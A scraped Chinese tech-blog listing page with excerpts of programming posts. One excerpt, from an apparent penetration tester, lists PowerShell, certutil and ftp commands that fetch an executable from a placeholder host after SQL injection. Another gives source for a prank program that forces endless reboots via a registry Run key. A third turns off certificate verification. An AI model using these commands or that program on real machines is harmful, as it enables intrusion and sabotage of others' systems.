</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20e25156e178b8bb996660fe8dea307a/" rel="bookmark">
			Qt扫盲-QList使用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QList使用总结 概述一、QList 声明及初始化1. 声明 QList2. 初始化 QList 二、QList 基本的 增加、删除、移动、修改1. 增加节点2. 删除节点3. 移动节点4. 修改节点值 三、QList 定位节点四、QList 的基本信息五、QList 迭代器功能 概述 QList是Qt的泛型容器类之一。它将项目存储在一个列表中，该列表提供基于索引的快速访问以及基于索引的插入和删除。
QList、QLinkedList 和 QVector 提供了类似的 API 和功能。它们通常是可互换的，但性能有所区别。
QVector 应该是默认首选的容器QList是最广泛用于Qt API中传递值的容器QList不是指针结构体类型的链表，真正的结构体指针链表是 QLinkedList 一、QList 声明及初始化 QList可以保存基本数据类型的，如int，double，bool等；但是在存储QObject对象及其子类对象时，不能直接存对象本身，而是只能存对象的地址；
1. 声明 QList 声明简单：
//基本数据类型 QList&lt;int&gt; integerList; QList&lt;QDate&gt; dateList; //存储QObject对象的地址 QList &lt;QWidget *&gt; ptr_widgets; QList &lt;QObject *&gt; ptr_objects; 2. 初始化 QList 初始化也很简单；若没初始化，链表默认为空的。
QList&lt;QString&gt; list = { "one", "two", "three" }; QWidget * widget1 = new QWidget(); QWidget * widget2 = new QWidget(); QList&lt;QWidget *&gt; ptr_widgets = {widget1, widget2}; 二、QList 基本的 增加、删除、移动、修改 QList 在有些实现都是需要多个基本操作组合来实现的，不同的实现用的方法也不一致，Qt提供的都是最核心、最单一的功能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20e25156e178b8bb996660fe8dea307a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a970e637a3f88075f54f5a0dfeedb9/" rel="bookmark">
			Unity Cursor（光标设置）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Static Properties 静态属性 lockState确定硬件指针是锁定到视图中心、受限于窗口还是根本不受限。visible确定硬件指针是否可见。 CursorLockMode（给lockState赋值的） 名称 介绍 None鼠标解除修改（限制），并恢复显示Locked将光标锁定到Game窗口的中心，并隐藏Confined将光标限制在Game窗口中，并显示 Static Methods 静态方法 SetCursor设置鼠标光标贴图 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f98b29ced5b8f218506ec01e114499e/" rel="bookmark">
			Docker镜像运行VUE项目&#43;防止Nginx访问出现的静态资源404错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		完整的Vue项目发布，防止报404错。
Docker部署的应用需要上传文件，上传的静态文件需要通过nginx访问，出现nginx访问404问题！
首先可以确定nginx容器是正常启动的，但是前端代码部署的路径也没问题.
1、将vue项目编译，npm run build
之后形成的disk文件夹压缩成zip包，方便上传
在服务器上新建目录：
mkdir /app/myPro
将项目disk上传到myPro文件夹里
解压：
unzip disk
2、在myPro文件夹里新建dockerfile文件
Dockerfile内容如下：
#标准的nginx镜像,我们需要基于标准的nginx镜像制作自己的镜像
FROM nginx
#设置生成镜像的Author
MAINTAINER ss
VOLUME /tmp
#拷贝当前目录的文件到指定文件夹下，改文件夹为镜像中的文件夹
COPY dist/ /usr/share/nginx/html/
#拷贝.conf文件到镜像下，替换掉原有的nginx.conf
COPY nginx.conf /etc/nginx/nginx.conf
ENV LANG en_US.UTF-8
EXPOSE 80
EXPOSE 443
#输出完成
RUN echo 'build images is ok!'
3、在myPro文件夹里，新建ningx.conf文件，内容如下：
worker_processes auto; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; client_max_body_size 20m; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; #配置Vue项目根路径 index index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f98b29ced5b8f218506ec01e114499e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b0e3121c989e94140b5c7797f32cb0f/" rel="bookmark">
			Windows下默认远程下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景： 在过去我在做某次台湾渗透的过程中遇到了一个sql注入，数据库权限是sa权限，主机在内网无法直接登录，我们需要上传nc或者其他的转发程序将其转发出来，即便不行，我们也需要上传一个shell，但是基于没有后台的情况下，我们只能将希望寄托于sa。
应用：
Powershell
certutil
ftp
Powershell
在windows版本中powershell支持部分linux命令。如curl，所以可以在系统支持powershell的情况下我们可以使用：
curl -O http://xxxxx/1.exe 来进行下载执行。当然还有其他的方式，powershell自带的不止curl一种，我们还可以使用：
Invoke-WebRequest
Invoke-RestMethod
Start-BitsTransfer
System.Net.WebClient
来进行下载，用法分别为：
Invoke-WebRequest -Uri http://xxxxx/1.exe -outfile 1.exe
Invoke-RestMethod -Uri http://xxxxx/1.exe -outfile 1.exe
Start-BitsTransfer -Source "http://xxxx/1.exe" -Destination "1.exe"
(new-object System.Net.WebClient).DownloadFile('http://xxxxx/1.exe', '1.exe'))
Certutil
certutil.exe -urlcache -split -f 指定url 指定路径
我们在上传过程中二进制文件是会出错的，它仅可以将头文件上传，并不可以上传完整的文件。所以在过程中我们同样可以使用certutil对二进制文件进行编码转换。
certutil.exe -encode 文件路径+文件名 转换后文件名字.txt
解码的过程使用：
certutil.exe -decode 文件路径+文件名 转换后文件名
加解密后保存路径为同一路径。
有时候我们无法使用http的时候我们可以优先选择使用ftp，首先我们需要在公网架设一个ftp，然后使用命令语法将ftp的配置写入。
配置内容为：
open 127.0.0.1 //打开ftp
username //账号
password //密码
get 1.exe d:\1.exe //下载文件到指定目录
bye //退出
然后使用ftp -s:文件名 执行该ftp配置文件即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed2e71ab0c4a637a58e35f3c302f1374/" rel="bookmark">
			前端性能优化 雅虎军规
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、尽量减少HTTP请求个数——须权衡
合并图片（如css sprites，内置图片使用数据）、合并CSS、JS，这一点很重要，但是要考虑合并后的文件体积。
2、使用CDN（内容分发网络）
这里可以关注CDN的三类实现：镜像、高速缓存、专线，以及智能路由器和负载均衡；
3、为文件头指定Expires或Cache-Control，使内容具有缓存性。
区分静态内容和动态内容，避免以后页面访问中不必要的HTTP请求。
4、避免空的src和href
留意具有这两个属性的标签如link，script，img，iframe等；
5、使用gzip压缩内容
Gzip压缩所有可能的文件类型以来减少文件体积
6、把CSS放到顶部
实现页面有秩序地加载，这对于拥有较多内容的页面和网速较慢的用户来说更为重要，同时，HTML规范清楚指出样式表要放包含在页面的区域内；
7、把JS放到底部
HTTP/1.1 规范建议，浏览器每个主机名的并行下载内容不超过两个，而问题在于脚本阻止了页面的平行下载，即便是主机名不相同
8、避免使用CSS表达式
页面显示和缩放，滚动、乃至移动鼠标时，CSS表达式的计算频率是我们要关注的。可以考虑一次性的表达式或者使用事件句柄来代替CSS表达式。
9、将CSS和JS放到外部文件中
我们需要权衡内置代码带来的HTTP请求减少与通过使用外部文件进行缓存带来的好处的折中点。
10、减少DNS查找次数
我们需要权衡减少 DNS查找次数和保持较高程度并行下载两者之间的关系。
11、精简CSS和JS
目的就是减少下载的文件体积，可考虑压缩工具JSMin和YUICompressor。
12、避免跳转
为了确保“后退”按钮可以正确地使用，使用标准的 3XXHTTP状态代码；同域中注意避免反斜杠 “/” 的跳转；
跨域使用 Alias或者 mod_rewirte建立 CNAME（保存一个域名和另外一个域名之间关系的DNS记录）
13、剔除重复的JS和CSS
重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。
14、配置ETags
Entity tags（ETags）（实体标签）是web服务器和浏览器用于判断浏览器缓存中的内容和服务器中的原始内容是否匹配的一种机制（“实体”就是所说的“内 容”，包括图片、脚本、样式表等），是比last-modified date更更加灵活的机制，单位时间内文件被修过多次，Etag可以综合Inode(文件的索引节点(inode)数)，MTime(修改时间)和Size来精准的进行判断，避开UNIX记录MTime只能精确到秒的问题。 服务器集群使用，可取后两个参数。使用ETags减少Web应用带宽和负载。
15、使AJAX可缓存
利用时间戳，更精巧的实现响应可缓存与服务器数据同步更新。
16、尽早刷新输出缓冲
尤其对于css，js文件的并行下载更有意义
17、使用GET来完成AJAX请求
当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。在url小于2K时使用GET获取数据时更加有意义。
18、延迟加载
确定页面运行正常后，再加载脚本来实现如拖放和动画，或者是隐藏部分的内容以及折叠内容等。
19、预加载
关注下无条件加载，有条件加载和有预期的加载。
20、减少DOM元素个数
使用更适合或者在语意是更贴切的标签，要考虑大量DOM元素中循环的性能开销。
21、根据域名划分页面内容
很显然， 是最大限度地实现平行下载
22、尽量减少iframe的个数
考虑即使内容为空，加载也需要时间，会阻止页面加载，没有语意，注意iframe相对于其他DOM元素高出1-2个数量级的开销，它会在典型方式下阻塞onload事件，IE和Firefox中主页面样式表会阻塞它的下载。
23、避免404
HTTP请求时间消耗是很大的，有些站点把404错误响应页面改为“你是不是要找***”，这虽然改进了用户体验但是同样也会浪费服务器资源（如数据库等）。最糟糕的情况是指向外部 JavaScript的链接出现问题并返回404代码。首先，这种加载会破坏并行加载；其次浏览器会把试图在返回的404响应内容中找到可能有用的部分当作JavaScript代码来执行。
24、减少Cookie的大小
去除不必要的coockie
使coockie体积尽量小以减少对用户响应的影响
注意在适应级别的域名上设置coockie以便使子域名不受影响
设置合理的过期时间。较早地Expire时间和不要过早去清除coockie，都会改善用户的响应时间。
25、使用无cookie的域
确定对于静态内容的请求是无coockie的请求。创建一个子域名并用他来存放所有静态内容。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed2e71ab0c4a637a58e35f3c302f1374/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8137a1a878680b0575b5c1fdf1420c9/" rel="bookmark">
			vue表格自动滚动且大小自适应（vh）, 自定义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;template&gt;
&lt;!-- 配合vue PC端适配方案 --&gt;
&lt;div class="div-table"&gt;
&lt;div
class="div-table-header"
:style="{ height: height + 'vh', lineHeight: height + 'vh' }"
&gt;
&lt;span&gt;序号&lt;/span&gt;
&lt;span&gt;姓名&lt;/span&gt;
&lt;span&gt;年龄&lt;/span&gt;
&lt;/div&gt;
&lt;div class="div-table-body" :style="{ height: height*num + 'vh' }"&gt;
&lt;div
v-for="(item, index) in list"
:key="index"
class="content"
:class="{ active: index % 2 }"
:style="{
height: height + 'vh',
lineHeight: height + 'vh',
transform: 'translateY(' + topWidth + 'vh)',
}"
&gt;
&lt;span&gt;{{ index }}&lt;/span&gt;
&lt;span&gt;{{ item.name }}&lt;/span&gt;
&lt;span&gt;{{ item.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8137a1a878680b0575b5c1fdf1420c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6437428501ac569542ec7d2e3dcc65c0/" rel="bookmark">
			解决Element 的 el-cascader高度问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原代码： &lt;el-cascader style="width:170px;" :options="shopList" :props="shopListProps" clearable :show-all-levels="false" v-model="searchShop" filterable collapse-tags size="small" popper-class="train-tree-cascader" &gt;&lt;/el-cascader&gt; 注意最下面的 popper-class 是Element提供的 《自定义浮层类名》
有了类名就好找了
原代码样式：
.train-tree-cascader{
height: 500px !important;
}
.train-tree-cascader .el-cascader-panel{
height: 100% !important;
}
.train-tree-cascader .el-cascader-panel .el-cascader-menu__wrap{
height: 104% !important;
}
注意！
style 不能加scoped，虽然这个是全局样式，但是由于自定义浮层类名是自己加的，所以不会出现全局污染的状况
给个赞👍
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5fbc8619eec42e20a35ae885e229e04/" rel="bookmark">
			C语言/C&#43;&#43;游戏项目完整教程：《打砖块》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打砖块游戏是一种动作电子游戏的名称。玩家操作一根萤幕上水平的“棒子”，让一颗不断弹来弹去的“球”在撞击作为过关目标消去的“砖块”的途中不会落到萤幕底下。球碰到砖块、棒子与底下以外的三边会反弹，落到底下会失去一颗球，把砖块全部消去就可以破关。 始祖是美国英宝格公司（en:Atari Games，ja:アタリ (ゲーム)）于1976年推出的街机游戏“Breakout”（en:Breakout），由该公司在1972年发行的“PONG”（en:PONG，ja:ポン (ゲーム)，世界上第一款电子游戏，类似台球）改良而来。相较于其前作，一个人就可以玩与变化丰富这两项特点让Breakout相当卖座，使各家公司竞相模仿。 因为规则简单与游戏性，现在许多移动电话都有内建打砖块游戏，也有许多因特网小游戏版本，目前在网上可以轻易查到。 我们今天就来自己写经典游戏《打砖块》 游戏目标：消除所有的方块即可过关。操作指南：游戏中使用键盘方向键←→控制移动
OK，了解游戏的基本操作以及游戏玩法之后就可以开始我们的编程之旅了，今天我会一步代码一个图片的来分布展示，希望这种方式可以让大家更容易的理解，如果有其他更好的方式，也欢迎大家向我提出建议 首先是创建一个游戏窗口，我们用EasyX图形库来做，只需要一行代码 hwnd = initgraph(800, 800); 这样我们就创建了一个800*800的窗口，非常简单，非常好用，这也是非常适合初学者去尝试的，这里我们写在主函数里面就可以了 接下来就是我们的老朋友结构体了，木板、球、以及砖块，这没什么好说的，不管啥项目用结构体都是很常见的 //木板的过程 struct Board { int x; int y; int speed; COLORREF color; int width; int height; }; //struct Board board = { 300, 800 - 25,1, WHITE, 200, 25 }; struct Board* createBoard(int x, int y, int speed, COLORREF color, int width, int height) { struct Board* pBoard = (struct Board*)malloc(sizeof(struct Board)); //结构体指针-&gt;成员 -&gt;指针指向运算符 //(*指针).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5fbc8619eec42e20a35ae885e229e04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d53e89256ce9e0f590dd60cadd5ac251/" rel="bookmark">
			java个人汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.数据类型 ①：基本数据类型：byte、short、int、long、float、double、char、boolean
②：引用数据类型: 数组、类、接口。
级别从低到高为：byte,char,short(这三个平级)——&gt;int——&gt;float——&gt;long——&gt;double
自动类型转换：从低级别到高级别，系统自动转的；
强制类型转换：什么情况下使用?把一个高级别的数赋给一个别该数的级别低的变量；
2.内存区 java分了5片内存。
1：寄存器。2：本地方法区。3：方法区。4：栈。5：堆。
栈：存储的都是局部变量 ( 函数中定义的变量，函数上的参数，语句中的变量 )；
只要数据运算完成所在的区域结束，该数据就会被释放。
堆：用于存储数组和对象，也就是实体。啥是实体啊？就是用于封装多个数据的。
1：每一个实体都有内存首地址值。
2：堆内存中的变量都有默认初始化值。因为数据类型不同，值也不一样。
3：垃圾回收机制。
3.框架集合 特点：
1：对象封装数据，对象多了也需要存储。集合用于存储对象。
2：对象的个数确定可以使用数组，但是不确定怎么办？可以用集合。因为集合是可变长度的。
集合和数组的区别：
1：数组是固定长度的；集合可变长度的。
2：数组可以存储基本数据类型，也可以存储引用数据类型；集合只能存储引用数据类型。
3：数组存储的元素必须是同一个数据类型；集合存储的对象可以是不同数据类型。
数据结构：
就是容器中存储数据的方式。
对于集合容器，有很多种。因为每一个容器的自身特点不同，其实原理在于每个容器的内部数据结构不同。
集合容器在不断向上抽取过程中。出现了集合体系。
在使用一个体系时，原则：参阅顶层内容。建立底层对象。
——&lt; java.util &gt;—— Collection接口：
Collection：
|——List：有序(元素存入集合的顺序和取出的顺序一致)，元素都有索引。元素可以重复。
|——Set：无序(存入和取出顺序有可能不一致)，不可以存储重复元素。必须保证元素唯一性。
1，添加：
add(object)：添加一个元素
addAll(Collection) ：添加一个集合中的所有元素。
2，删除：
clear()：将集合中的元素全删除，清空集合。
remove(obj) ：删除集合中指定的对象。注意：删除成功，集合的长度会改变。
removeAll(collection) ：删除部分元素。部分元素和传入Collection一致。
3，判断：
boolean contains(obj) ：集合中是否包含指定元素 。
boolean containsAll(Collection) ：集合中是否包含指定的多个元素。
boolean isEmpty()：集合中是否有元素。
4，获取：
int size()：集合中有几个元素。
5，取交集：
boolean retainAll(Collection) ：对当前集合中保留和指定集合中的相同的元素。如果两个集合元素相同，返回flase；如果retainAll修改了当前集合，返回true。
6，获取集合中所有元素：
Iterator iterator()：迭代器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d53e89256ce9e0f590dd60cadd5ac251/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5ceed4072fa02467457cee5b3771405/" rel="bookmark">
			【C语言】30行代码写出无限重启程序，室友太吵怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
序
嗨，这里是狐狸~~
基本思路📝
注册表
代码解析📝
序 路漫长而阔远，一片星空美到寂。
嗨，这里是狐狸~~ 今天是2022年1月6日，时间飞逝啊，很多同学都已经放寒假了吧，真的很羡慕放假的同学们。先给大家透个底，今天这个项目厉害了，今天做个恶搞程序，这也是很多年前做的项目了，那时室友天天通宵打游戏，弄得我整晚整晚的睡不着，之后便有了这个无限重启程序，可以说打着之后她再也不敢通宵打游戏了，嘿嘿，现在觉着也满是怀念啊。
基本思路📝 &lt;Windows.h&gt; 运用&lt;Windows.h&gt;头文件，这就是说在这个程序只针对去Windows操作系统，其他的不行。
注册表 通过注册表实现开机自启，这样才能无限重启。
其他的就很简单了，主要是Windows自带的功能，我们调用并进行无限循环操作就好了，嘿嘿。
代码解析📝 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;Windows.h&gt; int WINAPI WinMain(HINSTANCE hInstance , HINSTANCE hPreInstance ,LPSTR lpCmdLine , int nCmdShow) { //无限重启 //调整权限 HANDLE hToken; OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken); //查看特权值 LUID luid; LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &amp;luid); //调整权限 TOKEN_PRIVILEGES tkp; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tkp.Privileges[0].Luid = luid; AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL); //开机自启动 //计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKEY hKey; if (ERROR_SUCCESS !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5ceed4072fa02467457cee5b3771405/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/615a8e19e2568dff2b4f2e5f8a0c9707/" rel="bookmark">
			解决O2OA自签名证书后onlyoffice无法预览及保存文件问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		onlyoffice在o2oa下安装部署后，https模式下可以正常预览。为了安全起见，决定启用https模式，于是按照官方文档（https://www.o2oa.net/course/lz2heo.html）的介绍，采用了自签名证书的模式，后来发现onlyoffice在https模式下不能使用了，折腾整整5天时间，查阅了大量文章，发现官方发布的试用版本中，在https模式下也无法预览，官方相关文档和论支坛也未提到类似问题，于是总结如下。
（今天是2022年3月8日，女同胞们的日子，问题得以解决，很开心哦！）
废话少说，现将出现的问题及解决办法总结如下：
解决o2oa与onlyoffice访问时出现的Mix Content问题 按F12打开开发人员工具在console下显示Mix Content（网站混合），原因是o2oa已经实现https://xxx.xxx.xxx访问了，而onlyoffice仍然采用httpp访问。于是参考文章（https://blog.csdn.net/hotqin888/article/details/112722607）实现了onlyoffice通过https访问，Mix Content问题得以解决。
继续解决onlyoffice在预览文件时提示“下载失败”问题 原因1：SSL 认证之后，request.getScheme()获取不到https的问题记录
通过如下命令进入onlyoffice容器
#docker exec -it onlyoffice容器ID bash
通过如下命令查看onlyoffice的日志
#find / -name out.log
/var/log/onlyoffice/documentserver/converter/out.log
/var/log/onlyoffice/documentserver/docservice/out.log
/var/log/onlyoffice/documentserver/spellchecker/out.log
/var/log/onlyoffice/documentserver/metrics/out.log
/var/log/onlyoffice/documentserver/gc/out.log
#cat /var/log/onlyoffice/documentserver/docservice/out.log
发现http://xxx.xxx.xxx:20020/xxxx
这是问题的关键所在，原因是SSL 认证之后，request.getScheme()获取不到https的问题记录（参见文章https://www.cnblogs.com/start-fxw/p/7890337.html），我只参考了该文章的原因，具体解决办法是修改： xxx/o2server/servers/applicationServer/work/x_onlyofficefile_assemble_control/WEB-INF/classes/com/x/onlyofficefile/assemble/control/jaxrs/onlyoffice/utility/DocumentManager.class的源码DocumentManager.java,DocumentManager.java源码路径：xxxx\o2server\servers\applicationServer\work\x_onlyofficefile_assemble_control\describe\sources\com\x\onlyofficefile\assemble\control\jaxrs\onlyoffice\utility\DocumentManager.java
将所有 request.getScheme()修改为字符串 “https”,在eclipse中重新导出DocumentManager.class即可。
原因2：docker node js无法对客户端自签名证书进行认证
解决办法：关闭客户端证书认证
进入onlyoffice容器并修改onlyoffice的default.json文件 参考文献：https://blog.csdn.net/boliang319/article/details/105650310
docker exec -it 容器ID bash
通过如下命令修改default.json文件,将"rejectUnauthorized"修改为false
#vim /etc/onlyoffice/documentserver/default.json
"requestDefaults": {
"headers": {
"User-Agent": "Node.js/6.13"
},
"rejectUnauthorized": false
}
注意：如下onlyoffice容器内无法使用vim命令，可尝试#apt-get update 然后 #apt-get install vim 如果仍然不行，可通过docker cp将容器内的default.json复制到linux宿主机修改后复制回去。
重启onlyoffice的docker容器，使配置生效 docker restart 容器ID
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/615a8e19e2568dff2b4f2e5f8a0c9707/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa225cb6ab59f55369c225c98c570ee8/" rel="bookmark">
			【最新】Neo4j官方建议Spring Boot 2.4.及以上版本用Neo4j Java Driver代替The Spring Boot starter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Neo4j官方建议Spring Boot 2.4.及以上版本用Neo4j Java Driver代替The Spring Boot starter SpringBoot2.*使用Neo4j起因Neo4j官方文档在SpingBoot中使用Neo4j Java Driverpom.xml依赖代码样例 SpringBoot2.*使用Neo4j 起因 其实网上有很多关于SpringBoot集成Neo4j的例子，但是二者结合的方法规则几乎每年都在变，比如org.springframework.data.neo4j.core.schema中没有@NodeEntity，@StartNode，@EndNode等注解，所以网上的一些样例放到现在是行不通的
目前，我在用SpringBoot（Version：2.6.4）集成Neo4j时，遇到了一些问题，也在CSDN上发布了这些问题：
问题1：
springboot集合neo4j引用了org.neo4j的包，报错Required identifier property not found for class
问题2：
用SpringBoot集成neo4j，查询报错Could not find mappable nodes or relationships inside Record
但是没有得到回复。我就去翻了Neo4j官方文档
Neo4j官方文档 Neo4j Java Driver Spring Boot Starter.
进入上面的链接，可以明确看到
The Spring Boot starter is now superseded by the Neo4j Java Driver auto config starting with Spring Boot 2.4. For Spring Boot 2.3. we will still provide support with this starter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa225cb6ab59f55369c225c98c570ee8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bc3d3b1aa90f79733ff03256b592edf/" rel="bookmark">
			共空间模式 CSP 和滤波器组共空间模式 FBCSP 的 MATLAB 实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考的博客：点击此处链接跳转
在博主的基础之上，修改为函数，并且增加了 FBCSP 的函数
共有四个函数
cspfunc：针对两类脑电和标签提取csp特征并获取滤波器
cspfilt：使用获取的csp滤波器滤波
fbcspfunc：针对两类脑电和标签提取fbcsp特征并获取滤波器（fbcsp 就是分频段组合的 csp，可以是csps？）
fbcspfilt：使用获取的fbcsp滤波器滤波
需要注意的是，必须先进行 func 计算获取滤波器参数，才能进行 filt
cspfunc 函数（主要的函数，借鉴上边博主的demo，大家如果觉得这篇有用也请一定去支持一下他）：
function [cspfeature cspw] = cspfunc(eeg,label,m) % eeg:分段后的三维脑电（已滤波），采样点 * 通道 * 实验次数 % label：脑电的标签，列向量，值只有 1 和 2 % m：csp 参数 % cspfeature:提取到的fbcsp 特征，主要用于训练，如果是测试，需要用 fbcspfilt 函数滤波 % cspw:fbcsp 滤波器 %check and initializations EEG_Channels = size(eeg,2); % 通道数目 EEG_Trials = size(eeg,3); % 实验次数 classLabels = unique(label);% Return non-repeating values EEG_Classes = length(classLabels); % 标签类个数 covMatrix = cell(EEG_Classes,1); % 协方差矩阵 % Computing the normalized covariance matrices for each trial trialCov = zeros(EEG_Channels,EEG_Channels,EEG_Trials); for i = 1:EEG_Trials E = eeg(:,:,i)'; EE = E*E'; trialCov(:,:,i) = EE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bc3d3b1aa90f79733ff03256b592edf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/938b01acd1569b937cc06819296b30ce/" rel="bookmark">
			Nginx安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用版本为1.20
下载 # 下载 wget https://nginx.org/download/nginx-1.20.1.tar.gz # 安装依赖 yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel # 解压 tar -zxvf nginx-1.20.1.tar.gz # 执行配置 cd nginx-1.20.1/ ./configure # 编译安装(默认安装在/usr/local/nginx) make make install # 启动 cd /usr/local/nginx/sbin ./nginx nginx 修改配置后不需要重启，重新加载配置即可：nginx -s reload , 配置修改后查看是否正确，命令 nignx -t
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1da2425b9e39ea0c4cc8ae1a6d9ef13a/" rel="bookmark">
			在pytorch里可以通过AllenNLP包使用ELMo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、环境配置
1.在conda中创建allennlp环境：
conda create -n allennlp python=3.6 2.安装allennlp
pip install allennlp 二、下载训练好的参数和模型
参数下载：
链接: weights.hdf5
模型下载：options.json
三、获得词向量
from allennlp.modules.elmo import Elmo, batch_to_ids options_file = "options.json" # 配置文件地址 weight_file = "weights.hdf5" # 权重文件地址 # 这里的1表示产生一组线性加权的词向量。 # 如果改成2 即产生两组不同的线性加权的词向量。 elmo = Elmo(options_file, weight_file, 1, dropout=0) # use batch_to_ids to convert sentences to character ids sentence_lists = ["I have a dog", "How are you , today is Monday","I am fine thanks"] character_ids = batch_to_ids(sentence_lists) embeddings = elmo(character_ids)['elmo_representations'] # use batch_to_ids to convert sentences to character ids context_tokens = [['I', 'love', 'you', '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1da2425b9e39ea0c4cc8ae1a6d9ef13a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/116888067a3caad518f3042109b3f652/" rel="bookmark">
			【面试常问】简单说一下冒泡排序以及核心实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单说一下冒泡排序 排序算法在我们平时开发中会有一定的应用，然而冒泡排序更是重中之重，因此就冒泡排序的核心思路以及核心实现整理一下！
冒泡排序比较的是相邻的元素，如果第一个数比第二个数大（小），就交换两个元素，没个相邻元素都这么比，直到比较最后一对，此时最后的数应该是最大（小）的；对所有元素重复此操作，就可以得出一个递增（递减）的数组；
需求：键盘录入一个数组（5个不同的整数）通过冒泡排序将数组进行排序并打印
0索引和1索引比较，如果0索引大于1索引的值，交换位置否则位置不变；1索引和2索引比较，方法类似 public class BubbleTest { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int[] arr = new int[5]; for(int i = 0; i &lt; 5; i++){ System.out.println("输入第"+(i+1)+"个数字："); arr[i] = sc.nextInt(); } System.out.println("排序前："); printArray(arr); BubbleShot(arr); System.out.println("排序后："); printArray(arr); } //冒泡排序 private static void BubbleShot(int[] arr) { for(int i = 0; i &lt; arr.length-1; i++){ for(int j = 0; j &lt; arr.length-1-i; j++){ if(arr[j] &gt; arr[j+1]){ int temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; } } } } //遍历数组 private static void printArray(int[] arr) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/116888067a3caad518f3042109b3f652/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d15c32368e37cb8cba70d7aa08caafe/" rel="bookmark">
			navicat删除记录后id不是从想要的数开始
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用Navicat删除记录后id如何更新 1、使用以下命令来重设自增的起始值
// n表示从几开始自增，1就表示从1开始 alter table user_tests AUTO_INCREMENT=n 2、使用以下命令清空数据表，ID就会从1开始
